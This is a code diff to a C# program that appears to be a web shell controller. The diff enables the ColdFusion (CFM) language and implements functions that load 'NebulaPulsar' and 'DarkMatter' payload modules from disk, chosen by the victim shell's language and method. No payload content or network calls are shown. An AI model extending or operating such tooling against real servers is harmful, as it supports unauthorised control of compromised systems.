@@ -43,7 +43,7 @@ namespace Alien
             { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
             { enLanguage.Ruby, "rb" },
-            //{ enLanguage.CFM, "cfm" }
+            { enLanguage.CFM, "cfm" }
         };
 
         public static Dictionary<enLanguage, string> m_dicPayloadExtension = new Dictionary<enLanguage, string>()
@@ -58,7 +58,7 @@ namespace Alien
             { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
             { enLanguage.Ruby, "rb" },
-            //{ enLanguage.CFM, "cfm" }
+            { enLanguage.CFM, "cfm" }
         };
 
         private readonly Dictionary<enLanguage, Func<string, Func<string, string, string>>> m_dicWrapper = new()
@@ -840,20 +840,36 @@ namespace Alien
 
         private byte[]? fnGetNebulaPulsar()
         {
+            string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
+            if (string.IsNullOrEmpty(szLang))
+                return null;
+            
+            bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;
 
+            string szPath = Path.Combine(Application.StartupPath, "Payloads", szLang, m_victim.ShellMethod, "NebulaPulsar." + (bIsJava ? "java" : "dll"));
+            if (!Path.Exists(szPath))
+                return null;
 
-            return null;
+            return File.ReadAllBytes(szPath);
         }
 
         /// <summary>
         /// Payload module of NebulaPulsar
         /// </summary>
         /// <returns></returns>
-        private bool fnDarkMatter()
+        private byte[]? fnDarkMatter(string szName)
         {
+            string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
+            if (string.IsNullOrEmpty(szLang))
+                return null;
 
+            bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;
+            
+            string szPath = Path.Combine(Application.StartupPath, "Payloads", szLang, m_victim.ShellMethod, szName + "." + (bIsJava ? "java" : "dll"));
+            if (!Path.Exists(szPath))
+                return null;
 
-            return true;
+            return File.ReadAllBytes(szPath);
         }
 
         private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
